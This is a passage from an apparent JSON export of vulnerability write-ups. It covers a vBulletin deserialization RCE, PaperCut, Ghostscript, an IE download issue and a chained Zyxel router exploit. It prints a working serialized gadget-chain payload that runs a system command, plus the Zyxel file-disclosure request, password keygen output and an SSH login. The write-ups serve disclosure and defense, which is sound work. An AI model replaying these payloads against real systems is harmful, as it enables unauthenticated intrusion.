return true;\r\n}\r\n```\r\n\r\nThe problem in this code is that to verify that the data is actually serialized, we take the untrusted user data in the `$data` variable and just check that its not an array or a blank string, and if we pass this criteria then we blindly pass it into an `unserialize()` call, before checking that `unserialize()` didn't return `false`. If `unserialize()` didn't return `false` then its assumed everything went okay and we reserialize the data using `serialize()`, save that into `$data` and return `true`.\r\n\r\nThe issue here is that no validation is actually done to ensure the serialized data is using expected classes and isn't just a malicious serialized object. Additionally as we will see later on, just checking that `unserialize()` doesn't return `false` isn't sufficient; we should also be checking that the object returned is of the expected type.\r\n\r\nWhilst the researchers tried to exploit this vulnerability using their normal methods of gadget chains and abusing the applications code, they found this was an issue as vBulletin has a lot of `vB_Trait_NoSerialize` traits on objects, making them impossible to deserialize without raising an exception. Additionally the one library that they did find some gadget chains in isn't loaded by default, since the `googlelogin` package isn't enabled by default in vBulletin despite it being installed, so they couldn't use they normal Monolog chain without a bit of tweaking.\r\n\r\nWhat tweaking you may ask? Well it turns out that `unserialize()` has some interesting behavior. If the class name it receives isn't valid, then it will return a `__PHP_Incomplete_Class` object. This will not cause the above code to fail though since it isn't a `false` value. Noticing this, the researchers then took a look into the autoloader behavior in vBulletin. The code for the autoloader can be seen below:\r\n\r\n```php\r\nspl_autoload_register(array('vB', 'autoload'));\r\n\r\nclass vB\r\n{\r\n    public static function autoload($classname, $load_map = false, $check_file = true)\r\n    {\r\n        $fclassname = strtolower($classname); // [0]\r\n        $segments = explode('_', $fclassname); // [0-1]\r\n\r\n        switch($segments[0]) // [1]\r\n        {\r\n            case 'vb':\r\n                $vbPath = true;\r\n                $filename = VB_PATH; // ./vb/\r\n                break;\r\n            case 'vb5':\r\n                $vbPath = true;\r\n                $filename = VB5_PATH; // ./vb5/\r\n                break;\r\n            default:\r\n                $vbPath = false;\r\n                $filename = VB_PKG_PATH; // ./packages/\r\n                break;\r\n        }\r\n\r\n        if (sizeof($segments) > ($vbPath ? 2 : 1))\r\n        {\r\n            $filename .= implode('/', array_slice($segments, ($vbPath ? 1 : 0), -1)) . '/'; // [2]\r\n        }\r\n\r\n        $filename .= array_pop($segments) . '.php'; // [3]\r\n\r\n        if(file_exists($filename))\r\n            require($filename); // [4]\r\n    }\r\n}\r\n```\r\n\r\nThey noticed that vBulletin has an autoloader at `vB::autoload()` which will be called whenever an unknown class is attempted to be accessed during deserialization. This code will take in a classname, split it on the `_` character, check what the first part of the path contains and will append the appropriate directory name to the beginning of the path, and then takes the rest of the path minus the last segment, and squishes it together, using `/` to separate each part of the final path name. Finally it takes the last item of the split and uses this as the filename to be accessed, appending `.php` to the end of it before adding it to the final path name. If a file exists at this resulting path, it is then loaded using a `require()` statement. No validation is done to see if this is an expected file path or similar though, so as long as the file exists in one of the three expected directories (`./vb/`, `./vb5/`, or `./packages/`), it will be possible to load it via `require()` with this code.\r\n\r\nThe researchers then realized that they could abuse this to load the autoloader of the Monolog library that they had a gadget chain in, such that the autoloader would be loaded into memory allowing them to use any classes within Monolog since any unknown ones will now be loaded by the Monolog autoloader. Keep in mind this is possible because the plugin is normally disabled but still installed, so all that's needed to use it is for some code to load some of its initializers into memory so that PHP knows where to find the classes in the deserialization gadget chain. With the Monolog autoloader now in place to help load any Monolog classes that the gadget chain may need that aren't already in memory, the researchers now had everything they needed to make their Monolog deserialization gadget chain work again.\r\n\r\n## PoC Code\r\nThe final PoC can be seen over at https://github.com/ambionics/vbulletin-exploits/blob/main/vbulletin-rce-cve-2023-25135.py  and looks roughly like the following code:\r\n\r\n```\r\nPOST /ajax/api/user/save HTTP/1.1\r\nHost: 172.17.0.2\r\nContent-Type: application/x-www-form-urlencoded \r\nContent-Length: 666\r\n\r\nsecuritytoken=guest\r\n&options=\r\n&adminoptions=\r\n&userfield=\r\n&userid=0\r\n&user[email]=pown@pown.net\r\n&user[username]=toto\r\n&password=password\r\n&user[password]=password\r\n&user[searchprefs]=a:2:{i:0;O:27:\"googlelogin_vendor_autoload\":0:{}i:1;O:32:\"Monolog\\\\Handler\\\\SyslogUdpHandler\":1:s:9:\"\\x00*\\x00socket\";O:29:\"Monolog\\\\Handler\\\\BufferHandler\":7:{s:10:\"\\x00*\\x00handler\";r:4;s:13:\"\\x00*\\x00bufferSize\";i:-1;s:9:\"\\x00*\\x00buffer\";a:1:{i:0;a:2:{i:0;s:[LEN]:\"[COMMAND]\";s:5:\"level\";N;}}s:8:\"\\x00*\\x00level\";N;s:14:\"\\x00*\\x00initialized\";b:1;s:14:\"\\x00*\\x00bufferLimit\";i:-1;s:13:\"\\x00*\\x00processors\";a:2:i:0;s:7:\"current\";i:1;s:6:\"system\";}}}}\r\n```\r\n\r\n## Final Notes\r\nI was unfortunately unable to determine what user the code will ultimately end up executing as; I presume it would be the user that vBulletin is running as though. However the fact that this is a unauthenticated deserialization bug that can be remotely exploited with no prior knowledge of the target makes it a pretty severe issue. The one saving grace is that it appears this bug may have been limited to only three editions of vBulletin, however if your running any of these versions its highly advisable to upgrade and to also perform a check to see if you have potentially been compromised by this vulnerability. I expect to see more widespread exploitation of this bug in the future given its ease of exploitation.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "63870256-0a26-43c2-bcd4-e5029f884b3b",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "80dc589a-d533-4baf-b006-a0f95a6ca52e",
      "created": "2023-04-19T14:52:34.6876Z",
      "revisionDate": "2023-05-02T09:26:34.585348Z",
      "document": "## [CVE-2023-24935](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-24935)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/2023/CVE-2023-24935/docs/Screenshot%202023-04-19%20152857.png)\r\n\r\n\r\n## Description:\r\nThe attacker easily can exploit the victim to click on his malicious webpage, which will trigger an information gathering, WebSocket, or more dangerous gettering information code or an even more bad situation. From this URL, the victim can trick himself, into downloading an evil softer, without any warnings, like a save button or etc. After this happens the victim is will be in serious trouble!\r\n\r\n## Staus: HIGH Vulnerability\r\n\r\n[+]Exploit:\r\n\r\n- Exploit Server:\r\n\r\n```HTML\r\n<!DOCTYPE html>\r\n<html>\r\n<body>\r\n\r\n\t<a href=\"PoC.php?subject=PHP&web=Microsoft.com\">Please visit the information page of Microsoft, this link is not working now.</a>\r\n\r\n</body>\r\n</html>\r\n```\r\n\r\n## Proof and Exploit\r\n[href](https://www.nu11secur1ty.com/2023/04/cve-2023-24935.html)\r\n\r\n## Time spend:\r\n03:30:00",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "b6620b23-d62d-4a03-86f2-c3020b84b746",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "dcc49204-dedf-4481-a2e0-9147642f76fb",
      "created": "2023-04-21T09:06:30.449524Z",
      "revisionDate": "2023-04-26T10:20:38.672813Z",
      "document": "## Overview\r\nOn April 14, 2023 the Zero Day Initiative published two advisories, [ZDI-23-233](https://www.zerodayinitiative.com/advisories/ZDI-23-233/) aka [CVE-2023-27350](https://nvd.nist.gov/vuln/detail/CVE-2023-27350) and [ZDI-23-232](https://www.zerodayinitiative.com/advisories/ZDI-23-232/) aka [CVE-2023-27351](https://nvd.nist.gov/vuln/detail/CVE-2023-27351), for two vulnerabilities affecting PaperCut MF and PaperCut NG.\r\n\r\n[PaperCut have released their own advisory](https://www.papercut.com/kb/Main/PO-1216-and-PO-1219) for these two vulnerabilities. The vulnerability [CVE-2023-27350](https://nvd.nist.gov/vuln/detail/CVE-2023-27350) allows an unauthenticated attacker to achieve remote code execution on a vulnerable PaperCut MF or NG Application Server and affects all versions of both products, from version 8.0 up to the patched version (as listed below). The CVE has been rated critical and has a [CVSS base score of 9.8](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2023-27350&vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.0&source=Zero%20Day%20Initiative). On April 19, 2023, PaperCut updated their advisory to report that this vulnerability has been exploited in the wild.\r\n\r\nOn April 21, 2023, [Huntress](https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software) published technical details on the vulnerability. \r\n\r\n## Guidance\r\nA vendor supplied patch is available and [should be applied](https://www.papercut.com/kb/Main/Upgrading) to successfully remediate the issue.\r\n\r\nFor PaperCut MF the following versions remediate the issue:\r\n* [20.1.7](https://www.papercut.com/products/mf/release-history/20-1/#v20-1-7)\r\n* [21.2.11](https://www.papercut.com/products/mf/release-history/21-2/#v21-2-11)\r\n* [22.0.9](https://www.papercut.com/products/mf/release-history/22-0/#v22-0-9)\r\n\r\nFor PaperCut NG the following versions remediate the issue:\r\n* [20.1.7](https://www.papercut.com/products/ng/release-history/20-1/#v20-1-7)\r\n* [21.2.11](https://www.papercut.com/products/ng/release-history/21-2/#v21-2-11)\r\n* [22.0.9](https://www.papercut.com/products/ng/release-history/22-0/#v22-0-9) ",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Command and Control"
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "d49147c7-36f7-459d-9dcd-d1e63e4b62da",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "32783a08-1af5-4a01-8fc3-e3191dea6c4e",
      "created": "2023-04-25T13:02:24.055798Z",
      "revisionDate": "2023-05-05T11:08:17.237925Z",
      "document": "# Description:\r\nThe IE suffers from bypassing its own security and warning security. After the usual user visits the malicious link from the attacker he will be pushed to download a malicious file from some malicious server that uses a pushing method to force the victim to download a dangerous file. After the victim executes the already downloaded file without any warning the attacker will use the already opened connection as a result of the user\u2019s interactions, with his PC and then he can do very malicious things with this PC, it depends on the scenario.\r\n\r\n# STATUS: High Vulnerability with a low success rate.\r\n\r\n# PoC: \r\n\r\n[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnC2HvpQpkV0oTyqYA18aIXUpgiR38fj4Ym8m8aHmmRTOK0_2SlbSiUOIzmd509eqq2y8wGNBaNP5wdjRh3OMHVg7Hi2QtD8YO7uRVgaEfOYT9eb_yaRclBY-0HQzMPNXQGe9NicnCV_7dAnHhplX9vw1BicyBOFfhercqpeNfOYwoQZPXHaWcLe01/s1920/Screenshot%202023-04-25%20150412.png)](https://www.youtube.com/watch?v=TCAp9DvZCVo)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "95db41db-4b1a-480e-bab3-55695eaac92a",
      "editorId": "38047d0b-ee12-4823-af3f-dbbd759fa225",
      "topicId": "dc2a6cc7-33f3-4146-a251-5117af80474a",
      "created": "2023-04-28T11:14:46.487927Z",
      "revisionDate": "2023-04-28T11:25:36.988009Z",
      "document": "Remote code execution in Ghostscript can be exploited by parsing malicious PostScript (EPS) files. \r\nThe software is very popular together with ImageMagic, and it's used to parse uploaded files to generate thumbnails or convert them to different formats.\r\n\r\n9.8 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\r\n\r\n## At risk\r\n\r\nAll versions older than  10.01.0\r\n\r\n## Mitigation\r\n\r\nUpdate to  10.01.0\r\n\r\n## Detection\r\n\r\n* https://www.tenable.com/cve/CVE-2023-28879\r\n\r\n\r\n## Proof of Concept\r\n\r\n* https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "43f09561-d1e5-44af-938d-e4bce0ba2d4c",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "f49ec6a8-353c-46eb-8560-1c584a797859",
      "created": "2023-04-28T12:42:05.555916Z",
      "revisionDate": "2023-05-16T17:14:57.048597Z",
      "document": "In December 2022,  `SEC Consult` released a blog with the title [The enemy from within: Unauthenticated Buffer Overflows in Zyxel routers still haunting users ](https://sec-consult.com/blog/detail/enemy-within-unauthenticated-buffer-overflows-zyxel-routers/). The blog explains an unauthenticated buffer overflow in more then 40 different Zyxel router models and the fast amount of thousands of routers that are vulnerable and accessible via the Internet.\r\nThe impact is still quite limited because the published [Metasploit exploit module](https://github.com/rapid7/metasploit-framework/pull/17388) only works from the LAN side.\r\n\r\nHowever, the **Unauthenticated Buffer Overflow** is not the only vulnerability on these routers and `SEC Consult` discovered another 7 vulnerabilities that are described in their security analysis [Multiple Critical Vulnerabilities in multiple Zyxel devices](https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/).\r\nWhile reading the security analysis and reviewing the other vulnerabilities, I discovered a new opportunity to build an exploit by chaining two other vulnerabilities that will allow an unauthenticated attacker to get privileged access to the Zyxel router from either the WAN or LAN side. The potential of this exploit to attack from the WAN side makes it quite dangerous taking into account the large number of non-patched Zyxel routers out there on the Internet.\r\n\r\nRecently, [CVE-2023-28770](https://www.tenable.com/cve/CVE-2023-28770) has been released covering the LFI vulnerability that is used in this  chained exploit.\r\n\r\n## Zyxel router chained RCE \r\n### Exploiting an unauthenticated  local file disclosure (LFI) vulnerability and a weak password derivation algorithm\r\nThe first vulnerability that stood out to me is the LFI vulnerability that is discussed in section 2 of the [Security Analysis by SEC Consult](https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/).\r\nThe LFI vulnerability is present in the `zhttp` binary that allows an unauthenticated attacker to read the entire configuration of the router via the vulnerable endpoint `/Export_Log?/data/zcfg_config.json`.\r\n\r\nThe burp request below shows a redacted response of the information that is disclosed such as encrypted passwords, account information, information on services configuration (FTP, Telnet, SSH), and hardware details such as serial number, hardware model etc. In total around 4000 lines of nested `JSON` information that you would not like to share with anyone out there.\r\n \r\n**LFI Burp request and response**\r\n```\r\nGET /Export_Log?/data/zcfg_config.json HTTP/1.1\r\nHost: zyxel-vuln-router:8080\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\r\nConnection: close\r\n```\r\n**Response (REDACTED)**\r\n```json\r\nHTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: 148678\r\nDate: Fri, 14 Apr 2023 08:47:46 GMT\r\nX-Frame-Options: sameorigin\r\nContent-Security-Policy: frame-ancestors 'self'\r\n\r\n---- Hardware Information ----\r\n{\r\n    \"Manufacturer\":\"ZYXEL\",\r\n    \"ManufacturerOUI\":\"XXXXX\",\r\n    \"ModelName\":\"VMG3625-T20A\",\r\n    \"Description\":\"Wireless AC VDSL2 4-port Gateway with USB\",\r\n    \"ProductClass\":\"VMG3625-T20A\",\r\n    \"SerialNumber\":\"S000Y00000000\",\r\n    \"SoftwareVersion\":\"V5.30(ABOU.2)b1_I0_20180821\",\r\n    \"AdditionalHardwareVersion\":\"\",\r\n    \"AdditionalSoftwareVersion\":\"\",\r\n    \"UpTime\":607055,\r\n    \"FirstUseDate\":\"2023-03-21T09:07:41\",\r\n    \"VendorConfigFileNumberOfEntries\":0,\r\n    \"SupportedDataModelNumberOfEntries\":0,\r\n    \"ProcessorNumberOfEntries\":0,\r\n    \"VendorLogFileNumberOfEntries\":0,\r\n    \"LocationNumberOfEntries\":0,\r\n    \"FixManufacturerOUI\":\"\"\r\n  },\r\n\r\n---- Account Information----\r\n\"X_ZYXEL_LoginCfg\":{\r\n    \"LoginGroupConfigurable\":true,\r\n    \"LogGp\":[\r\n      {\r\n        \"GP_Privilege\":\"_encrypt_XXXXXXXXXXXXXX\",\r\n        \"Account\":[\r\n          {\r\n            \"AutoShowQuickStart\":false,\r\n            \"Enabled\":true,\r\n            \"EnableQuickStart\":true,\r\n            \"Page\":\"\",\r\n            \"Username\":\"root\",\r\n            \"Password\":\"\",\r\n            \"PasswordHash\":\"\",\r\n            \"Privilege\":\"_encrypt_XXXXXXXXXXXXX\",\r\n            \"GetConfigByFtp\":true,\r\n            \"DefaultPassword\":\"_encrypt_XXXXXXXXXXXXXX\",\r\n            \"DefaultGuiPassword\":\"\",\r\n            \"ResetDefaultPassword\":false,\r\n            \"shadow\":\"root:$6$XXXXXXXXXXX:0::::::\\n\",\r\n            \"smbpasswd\":\"root:0:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:33A9D53C23525B5F63A0C536445E2B76:[U          ]:LCT-0000004E:\\n\",\r\n            \"ConfigAccountFromWAN\":false,\r\n            \"DefPwLength\":8,\r\n            \"AccountCreateTime\":0,\r\n            \"AccountRetryTime\":3,\r\n            \"AccountIdleTime\":300,\r\n            \"AccountLockTime\":300,\r\n            \"RemoHostAddress\":\"\",\r\n            \"DotChangeDefPwd\":false,\r\n            \"ShowSkipBtnInChgDefPwdPage\":false,\r\n            \"AutoGenPwdBySn\":false,\r\n            \"RemoteAccessPrivilege\":\"LAN\",\r\n            \"OldDefaultPassword\":\"\",\r\n            \"CardOrder\":\"\",\r\n            \"ThemeColor\":\"\",\r\n            \"HiddenPage\":\"\"\r\n          },\r\n          {\r\n            \"AutoShowQuickStart\":false,\r\n            \"Enabled\":true,\r\n            \"EnableQuickStart\":true,\r\n            \"Page\":\"\",\r\n            \"Username\":\"supervisor\",\r\n            \"Password\":\"\",\r\n            \"PasswordHash\":\"\",\r\n            \"Privilege\":\"_encrypt_XXXXXXXXXXX\",\r\n            \"DefaultPassword\":\"_encrypt_XXXXXXXXXXX\",\r\n            \"DefaultGuiPassword\":\"\",\r\n            \"ResetDefaultPassword\":false,\r\n            \"shadow\":\"supervisor:$6$XXXXXXXXXX:0::::::\\n\",\r\n            \"smbpasswd\":\"supervisor:12:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:33A9D53C23525B5F63A0C536445E2B76:[U          ]:LCT-0000004E:\\n\",\r\n            \"ConfigAccountFromWAN\":false,\r\n            \"DefPwLength\":8,\r\n            \"AccountCreateTime\":0,\r\n            \"AccountRetryTime\":3,\r\n            \"AccountIdleTime\":300,\r\n            \"AccountLockTime\":300,\r\n            \"RemoHostAddress\":\"\",\r\n            \"DotChangeDefPwd\":false,\r\n            \"ShowSkipBtnInChgDefPwdPage\":false,\r\n            \"AutoGenPwdBySn\":false,\r\n            \"RemoteAccessPrivilege\":\"LAN\",\r\n            \"OldDefaultPassword\":\"\",\r\n            \"CardOrder\":\"\",\r\n            \"ThemeColor\":\"\",\r\n            \"HiddenPage\":\"\"\r\n          }\r\n        ],\r\n        \"Level\":\"high\"\r\n      },\r\n\r\n---- Service Information ----\r\n  \"X_ZYXEL_RemoteManagement\":{\r\n    \"Service\":[\r\n      {\r\n        \"Name\":\"HTTP\",\r\n        \"Enable\":true,\r\n        \"Protocol\":6,\r\n        \"Port\":8080,\r\n        \"Mode\":\"LAN_WAN\",\r\n        \"TrustAll\":true,\r\n        \"OldMode\":\"LAN_ONLY\",\r\n        \"RestartDeamon\":1,\r\n        \"LifeTime\":20,\r\n        \"BoundInterfaceList\":\"\"\r\n      },\r\n      {\r\n        \"Name\":\"HTTPS\",\r\n        \"Enable\":true,\r\n        \"Protocol\":6,\r\n        \"Port\":443,\r\n        \"Mode\":\"LAN_WAN\",\r\n        \"TrustAll\":true,\r\n        \"OldMode\":\"LAN_ONLY\",\r\n        \"RestartDeamon\":true,\r\n        \"LifeTime\":20,\r\n        \"BoundInterfaceList\":\"\"\r\n      },\r\n      {\r\n        \"Name\":\"FTP\",\r\n        \"Enable\":true,\r\n        \"Protocol\":6,\r\n        \"Port\":21,\r\n        \"Mode\":\"LAN_WAN\",\r\n        \"TrustAll\":true,\r\n        \"OldMode\":\"LAN_ONLY\",\r\n        \"RestartDeamon\":true,\r\n        \"LifeTime\":20,\r\n        \"BoundInterfaceList\":\"\"\r\n      },\r\n      {\r\n        \"Name\":\"TELNET\",\r\n        \"Enable\":true,\r\n        \"Protocol\":6,\r\n        \"Port\":23,\r\n        \"Mode\":\"LAN_WAN\",\r\n        \"TrustAll\":true,\r\n        \"OldMode\":\"LAN_ONLY\",\r\n        \"RestartDeamon\":true,\r\n        \"LifeTime\":20,\r\n        \"BoundInterfaceList\":\"\"\r\n      },\r\n      {\r\n        \"Name\":\"SSH\",\r\n        \"Enable\":true,\r\n        \"Protocol\":6,\r\n        \"Port\":22,\r\n        \"Mode\":\"LAN_WAN\",\r\n        \"TrustAll\":true,\r\n        \"OldMode\":\"LAN_ONLY\",\r\n        \"RestartDeamon\":true,\r\n        \"LifeTime\":20,\r\n        \"BoundInterfaceList\":\"\"\r\n      },\r\n```\r\nNow this information disclosure in itself will not pose a direct threat to these routers, but of course attackers could try to crack the obtained encrypted shadow passwords, but this will take a long time.\r\n\r\nSo is there any other way to use the disclosed information for a successful attack?\r\n And of course the answer is `YES!`\r\n\r\nThe second vulnerability that comes into play is the vulnerability described in section 3 of the analysis, **\"Unsafe Storage of Sensitive Data\"**. \r\nIt explains the password derivation technique used to decrypt the `_encrypted_XXXXXX` passwords in the `JSON` configuration file using a static `AES Key and IV`.\r\nBut my attention was more drawn to another analysis [Getting root on a Zyxel VMG8825-T50 router](https://th0mas.nl/2020/03/26/getting-root-on-a-zyxel-vmg8825-t50-router/) done by `Thomas Rinsma` in 2020 that was referenced at the bottom of the section and where Thomas explains the password derivation techniques used on Zyxel routers.\r\nIn particular, section **\"Tangent 2: key and password derivation mechanisms\"** is quite interesting which describes in detail how the `supervisor` user password can be derived using the serial key of the router.\r\n\r\nSo what if we use the LFI vulnerability to get the serial key of the router and try to crack the `supervisor` password using this password derivation technique. \r\nWe can then use the disclosed router services information  to check if `ssh` or `telnet` is enabled and accessible from the WAN and try to login as `supervisor` to gain access to the router.\r\n\r\n`Bogi Napoleon Wennerstr\u00f8m` has reverse engineered and implemented  some of these derivation functions producing the `supervisor` password.\r\nHis repository can be found [here](https://github.com/boginw/zyxel-vmg8825-keygen) on Github.\r\nI tested his password derivation functions and indeed I can confirm that either `zcfgBeCommonGenKeyBySerialNumMethod2` or `zcfgBeCommonGenKeyBySerialNumMethod3` are working on vulnerable Zyxel routers.\r\n\r\n```console\r\n# python ./main.py S000Y00000000\r\nzcfgBeCommonGenKeyBySerialNum                   : A43338B488\r\nzcfgBeCommonGenKeyBySerialNum_CBT               : UdcTaX78\r\nzcfgBeCommonGenKeyBySerialNumMethod2            : 2dc1a078  <==\r\nzcfgBeCommonGenKeyBySerialNumMethod3            : 58Pxnwdefr <==\r\nzcfgBeCommonGenKeyBySerialNumConfigLength(1)    : EXXAY7XF\r\nzcfgBeCommonGenKeyBySerialNumConfigLength(2)    : 4UxwvUxf\r\nzcfgBeCommonGenKeyBySerialNumConfigLength(3)    : 4UxavUxf\r\nzcfgBeCommonGenKeyBySerialNumConfigLengthOld(1) : EXXAY7XF\r\nzcfgBeCommonGenKeyBySerialNumConfigLengthOld(2) : 4UxwvUxf\r\nzcfgBeCommonGenKeyBySerialNumConfigLengthOld(3) : 4UxavUxf\r\n\u250c\u2500\u2500(root\ud83d\udc80cuckoo)-[~/zyxel_exploit/zyxel-vmg8825-keygen]\r\n\u2514\u2500# ssh supervisor@zyxel-vuln-router\r\nsupervisor@zyxel-vuln-router's password:\r\n$ uname -a\r\nLinux VMG3625-T20A 2.6.36 #7 SMP Sat Aug 18 12:18:02 CET 2018 mips GNU/Linux\r\n$ \ufeffid\r\nuid=12(supervisor) gid=12 groups=12\r\n$\r\n```\r\nI have created a `Metasploit` module that chains these two vulnerabilities together to gain access to vulnerable Zyxel routers. \r\n[PR submission](https://github.com/rapid7/metasploit-framework/pull/17881) to mainstream `Metasploit` is completed and available.\r\n\r\n### Mitigation\r\nPlease follow this [Security Advisory](https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-multiple-vulnerabilities) of Zyxel to patch your router.\r\nAs temporary measure, you should disable all your services on the router such as `telnet`, `ftp` and `ssh` that allows access to the `supervisor` user and configure your web interface only to be accessible by the `admin` user.\r\n\r\n### References\r\n[CVE-2023-28770](https://www.tenable.com/cve/CVE-2023-28770)\r\n[The enemy from within: Unauthenticated Buffer Overflows in Zyxel routers still haunting users ](https://sec-consult.com/blog/detail/enemy-within-unauthenticated-buffer-overflows-zyxel-routers/).\r\n[Multiple Critical Vulnerabilities in multiple Zyxel devices](https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/).\r\n[Getting root on a Zyxel VMG8825-T50 router](https://th0mas.nl/2020/03/26/getting-root-on-a-zyxel-vmg8825-t50-router/)\r\n[Zyxel VMG8825-T50 Supervisor Keygen - Github](https://github.com/boginw/zyxel-vmg8825-keygen) \r\n[Zyxel Security Advisory](https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-multiple-vulnerabilities)\r\n[ Metasploit PR: Zyxel router chained RCE using LFI and weak password derivation algorithm](https://github.com/rapid7/metasploit-framework/pull/17881)\r\n\r\n### Credits\r\nCredits goes to:\r\n[SEC Consult team](https://sec-consult.com/contact/)\r\n[Thomas Rinsma] (https://www.linkedin.com/in/thomasrinsma)\r\n[Bogi Napoleon Wennerstr\u00f8m](https://github.com/boginw)\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Lateral Movement",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
